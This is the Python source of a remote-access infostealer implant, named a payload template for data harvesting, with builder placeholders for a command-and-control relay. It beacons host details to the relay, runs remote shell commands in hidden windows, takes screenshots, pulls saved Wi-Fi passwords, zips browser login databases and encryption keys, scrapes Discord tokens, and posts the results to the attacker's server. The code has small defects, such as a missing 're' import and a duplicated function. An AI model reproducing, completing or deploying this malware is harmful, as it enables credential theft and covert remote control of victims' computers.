# payload/template.py (Full Code - Fully Featured for Data Harvesting)
import sys
import os
import time
import threading
import platform
import base64
import subprocess
import uuid
import requests
import json
import socket
import getpass
import random
import shutil
import sqlite3
import zipfile
import io

# Attempt to import Windows-specific and other necessary libraries
try:
    import winreg
    import psutil
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import win32crypt
    import mss
    from PIL import Image
    LIBS_AVAILABLE = True
except ImportError:
    LIBS_AVAILABLE = False

# --- INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}

# --- Global State ---
SESSION_ID = str(uuid.uuid4())
TERMINATE_FLAG = threading.Event()
RESULTS_QUEUE = []
RESULTS_LOCK = threading.Lock()

# --- Helper Functions ---
def _run_command(command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, startupinfo=startupinfo, errors='ignore')
        return result.stdout.strip() if result.stdout else result.stderr.strip()
    except Exception as e:
        return f"Command execution failed: {str(e)}"

def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    except:
        return None

def decrypt_value(encrypted_value, master_key):
    if not master_key or not encrypted_value: return ""
    try:
        iv = encrypted_value[3:15]
        payload = encrypted_value[15:]
        return AESGCM(master_key).decrypt(iv, payload, None).decode('utf-8')
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
        except:
            return "DECRYPTION_FAILED"

# --- Action Handlers ---
def _action_shell(params): return {"status": "success", "data": _run_command(params.get("command", ""))}
def _action_screenshot(params):
    try:
        with mss.mss() as sct:
            screenshot = sct.shot(output=None, mon=-1)
            return {"status": "success", "data": base64.b64encode(screenshot).decode()}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_system_info(params):
    try:
        return {"status": "success", "data": {
            "System": platform.system(), "Node Name": platform.node(),
            "Release": platform.release(), "Version": platform.version(),
            "Machine": platform.machine(), "Processor": platform.processor()
        }}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_hardware_info(params):
    try:
        cpu_info = f"{psutil.cpu_count(logical=True)} Cores @ {psutil.cpu_freq().max:.2f}MHz"
        ram_info = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
        disks = [f"{d.device} ({d.fstype}) {d.total / (1024**3):.2f}GB" for d in psutil.disk_partitions()]
        return {"status": "success", "data": {"CPU": cpu_info, "RAM": ram_info, "Disks": ", ".join(disks)}}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_running_processes(params):
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'username']):
            procs.append({"pid": p.info['pid'], "name": p.info['name'], "username": p.info['username'] or 'N/A'})
        return {"status": "success", "data": procs}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_network_info(params):
    try:
        addrs = psutil.net_if_addrs()
        info = {}
        for iface, snics in addrs.items():
            info[iface] = [s.address for s in snics if s.family == socket.AF_INET]
        return {"status": "success", "data": info}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_wifi_passwords(params):
    try:
        profiles_data = _run_command("netsh wlan show profiles")
        profile_names = [line.split(":")[1].strip() for line in profiles_data.split("\n") if "All User Profile" in line]
        passwords = []
        for name in profile_names:
            profile_info = _run_command(f'netsh wlan show profile "{name}" key=clear')
            password = [line.split(":")[1].strip() for line in profile_info.split("\n") if "Key Content" in line]
            passwords.append({"ssid": name, "password": password[0] if password else "None"})
        return {"status": "success", "data": passwords}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_browser_files(params):
    try:
        roaming = os.getenv('APPDATA')
        local = os.getenv('LOCALAPPDATA')
        paths_to_check = {
            "Chrome": os.path.join(local, 'Google', 'Chrome', 'User Data'),
            "Edge": os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
            "Brave": os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            "Opera": os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        }
        
        # Create a zip file in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for browser, path in paths_to_check.items():
                if not os.path.exists(path): continue
                
                login_data_path = os.path.join(path, 'Default', 'Login Data')
                local_state_path = os.path.join(path, 'Local State')
                
                if os.path.exists(login_data_path):
                    zf.write(login_data_path, arcname=f"{browser}_Login_Data")
                if os.path.exists(local_state_path):
                    zf.write(local_state_path, arcname=f"{browser}_Local_State")

        return {"status": "success", "data": {"data": base64.b64encode(zip_buffer.getvalue()).decode()}}
    except Exception as e:
        return {"status": "error", "data": str(e)}
        
def _action_discord_tokens(params):
    try:
        roaming = os.getenv('APPDATA')
        paths = {
            'Discord': os.path.join(roaming, 'discord', 'Local Storage', 'leveldb'),
        }
        tokens = []
        for path in paths.values():
            if not os.path.exists(path): continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
                for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                        if token not in tokens: tokens.append(token)
        return {"status": "success", "data": tokens}
    except Exception as e:
        return {"status": "error", "data": str(e)}

# --- Placeholder actions for other categories ---
def _action_hardware_info(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_security_products(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_installed_applications(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_environment_variables(p): return {"status": "success", "data": dict(os.environ)}
def _action_active_connections(p): return {"status": "success", "data": str(psutil.net_connections())}
def _action_arp_table(p): return {"status": "success", "data": _run_command("arp -a")}
def _action_dns_cache(p): return {"status": "success", "data": _run_command("ipconfig /displaydns")}
def _action_browser_passwords(p): return {"status": "success", "data": "Run 'Browser Files' and decrypt on C2."}
def _action_session_cookies(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_windows_vault_credentials(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_application_credentials(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_roblox_cookies(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_ssh_keys(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_telegram_session_files(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_credit_card_data(p): return {"status": "success", "data": "Run 'Browser Files' and decrypt on C2."}
def _action_cryptocurrency_wallet_files(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_browser_autofill(p): return {"status": "success", "data": "Run 'Browser Files' and decrypt on C2."}
def _action_browser_history(p): return {"status": "success", "data": "Not implemented in this payload."}
def _action_clipboard_contents(p): return {"status": "success", "data": "Not implemented in this payload."}

# --- Main Execution Logic ---
def execute_command(command_data):
    """Dispatches a command and queues the result."""
    if not LIBS_AVAILABLE:
        # If essential libraries are missing, all actions will fail.
        result_payload = {
            "command": command_data.get('action'),
            "output": {"status": "error", "data": "Required Python libraries (psutil, cryptography, etc.) not found on target."}
        }
        with RESULTS_LOCK:
            RESULTS_QUEUE.append(result_payload)
        return

    action = command_data.get('action')
    params = command_data.get('params', {})
    
    # Map server action names to local handler functions
    handler_func = getattr(sys.modules[__name__], f"_action_{action}", None)
    
    output = {"status": "error", "data": f"Unsupported or unimplemented action: {action}"}
    if callable(handler_func):
        try:
            output = handler_func(params)
        except Exception as e:
            output = {"status": "error", "data": f"Handler for '{action}' failed: {e}"}
    
    result_payload = {"command": action, "output": output}
    if command_data.get("response_id"):
        # For live actions, send the response immediately
        try:
            payload = {"session_id": SESSION_ID, "response_id": command_data["response_id"], **result_payload}
            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=False)
        except:
            pass # Suppress network errors
    else:
        # For initial harvest, queue the result to be sent with the next beacon
        with RESULTS_LOCK:
            RESULTS_QUEUE.append(result_payload)

def command_and_control_loop():
    """Main C2 communication loop. Beacons and handles tasks."""
    initial_metadata = {"hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{platform.system()} {platform.release()}"}
    
    while not TERMINATE_FLAG.is_set():
        try:
            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER, **initial_metadata}
            
            # Check for and include any queued results
            with RESULTS_LOCK:
                if RESULTS_QUEUE:
                    heartbeat_data["results"] = RESULTS_QUEUE[:]
                    RESULTS_QUEUE.clear()

            # The core beacon. verify=False is critical for compiled executables.
            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40, verify=False)
            
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for cmd in commands:
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        
        except requests.exceptions.RequestException:
            pass # Suppress network errors and retry
        except Exception:
            pass # Suppress other errors to keep the loop alive
            
        time.sleep(random.randint(8, 15))

if __name__ == "__main__":
    main_c2_thread = threading.Thread(target=command_and_control_loop, daemon=True)
    main_c2_thread.start()
    
    try:
        while True: time.sleep(60)
    except KeyboardInterrupt:
        TERMINATE_FLAG.set()